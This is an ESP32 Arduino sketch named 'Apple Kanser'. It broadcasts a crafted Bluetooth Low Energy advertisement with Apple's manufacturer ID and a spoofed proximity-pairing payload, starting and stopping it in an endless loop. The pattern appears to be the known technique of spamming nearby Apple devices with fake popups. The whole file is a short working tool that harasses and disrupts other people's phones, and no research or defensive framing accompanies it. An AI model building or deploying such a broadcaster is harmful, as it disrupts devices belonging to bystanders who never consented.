/*
 * Apple Kanser
 * by Paul Harriet Asiñero
 * v0.1
 */

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
// #include <WiFi.h>

BLEServer *pServer;
BLEService *pService;
BLECharacteristic *pCharacteristic;
BLEAdvertising *pAdvertising;

uint8_t kanserData[] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x20, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc0, 0x27, 0x60, 0x4c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};


void setup() {
    Serial.println("Setting up...");
    // Turn off WiFi
    // WiFi.mode(WIFI_OFF);

    Serial.begin(115200);

    // Setup BLE
    BLEDevice::init("");
    pServer = BLEDevice::createServer();
    pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = BLEAdvertisementData();

    // Setup kanser data
    advertisementData.addData(std::string((char*)kanserData, sizeof(kanserData)));
    pAdvertising->setAdvertisementData(advertisementData);
    Serial.println("Setup done...");
}


void loop() {
    Serial.println("Apple kansering...");
    pAdvertising->start();
    delay(3000);
    pAdvertising->stop();
}